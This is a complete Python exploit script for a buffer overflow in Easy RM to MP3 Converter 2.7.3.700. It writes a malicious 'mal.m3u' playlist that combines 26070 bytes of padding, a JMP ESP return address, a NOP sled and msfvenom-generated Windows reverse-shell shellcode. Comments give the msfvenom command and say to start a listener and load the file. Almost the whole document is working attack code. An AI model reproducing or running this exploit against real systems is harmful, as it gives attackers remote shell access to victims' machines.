# Exploit for Easy RM to MP3 Converter 2.7.3.700
# NOTE: Offsets could be different on your machine

# msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=127.0.0.1 -f python -b "\x00\x09\x0a" -v sc
sc =  ""
sc += "\xb8\xa4\x51\xde\xd3\xd9\xc7\xd9\x74\x24\xf4\x5b\x31"
sc += "\xc9\xb1\x52\x31\x43\x12\x83\xeb\xfc\x03\xe7\x5f\x3c"
sc += "\x26\x1b\xb7\x42\xc9\xe3\x48\x23\x43\x06\x79\x63\x37"
sc += "\x43\x2a\x53\x33\x01\xc7\x18\x11\xb1\x5c\x6c\xbe\xb6"
sc += "\xd5\xdb\x98\xf9\xe6\x70\xd8\x98\x64\x8b\x0d\x7a\x54"
sc += "\x44\x40\x7b\x91\xb9\xa9\x29\x4a\xb5\x1c\xdd\xff\x83"
sc += "\x9c\x56\xb3\x02\xa5\x8b\x04\x24\x84\x1a\x1e\x7f\x06"
sc += "\x9d\xf3\x0b\x0f\x85\x10\x31\xd9\x3e\xe2\xcd\xd8\x96"
sc += "\x3a\x2d\x76\xd7\xf2\xdc\x86\x10\x34\x3f\xfd\x68\x46"
sc += "\xc2\x06\xaf\x34\x18\x82\x2b\x9e\xeb\x34\x97\x1e\x3f"
sc += "\xa2\x5c\x2c\xf4\xa0\x3a\x31\x0b\x64\x31\x4d\x80\x8b"
sc += "\x95\xc7\xd2\xaf\x31\x83\x81\xce\x60\x69\x67\xee\x72"
sc += "\xd2\xd8\x4a\xf9\xff\x0d\xe7\xa0\x97\xe2\xca\x5a\x68"
sc += "\x6d\x5c\x29\x5a\x32\xf6\xa5\xd6\xbb\xd0\x32\x18\x96"
sc += "\xa5\xac\xe7\x19\xd6\xe5\x23\x4d\x86\x9d\x82\xee\x4d"
sc += "\x5d\x2a\x3b\xc1\x0d\x84\x94\xa2\xfd\x64\x45\x4b\x17"
sc += "\x6b\xba\x6b\x18\xa1\xd3\x06\xe3\x22\xa3\xd6\xeb\xb3"
sc += "\x33\xd5\xeb\xb2\x78\x50\x0d\xde\x6e\x35\x86\x77\x16"
sc += "\x1c\x5c\xe9\xd7\x8a\x19\x29\x53\x39\xde\xe4\x94\x34"
sc += "\xcc\x91\x54\x03\xae\x34\x6a\xb9\xc6\xdb\xf9\x26\x16"
sc += "\x95\xe1\xf0\x41\xf2\xd4\x08\x07\xee\x4f\xa3\x35\xf3"
sc += "\x16\x8c\xfd\x28\xeb\x13\xfc\xbd\x57\x30\xee\x7b\x57"
sc += "\x7c\x5a\xd4\x0e\x2a\x34\x92\xf8\x9c\xee\x4c\x56\x77"
sc += "\x66\x08\x94\x48\xf0\x15\xf1\x3e\x1c\xa7\xac\x06\x23"
sc += "\x08\x39\x8f\x5c\x74\xd9\x70\xb7\x3c\xe9\x3a\x95\x15"
sc += "\x62\xe3\x4c\x24\xef\x14\xbb\x6b\x16\x97\x49\x14\xed"
sc += "\x87\x38\x11\xa9\x0f\xd1\x6b\xa2\xe5\xd5\xd8\xc3\x2f"

file = open('mal.m3u', 'w')

# JMP ESP in MSRMCcodec02.dll
ret = "\x88\x1d\x90\x01"

# Different offsets
offsetXPSP3 = 26070

# NOP sled is needed as this shellcode might overwrite some parts of itself
content = "A"*offsetXPSP3 + ret + "C" * 4 + "\x90" * 16 + sc

file.write(content)
file.close()

# Start a listener on 127.0.0.1:443 and load the mal.m3u
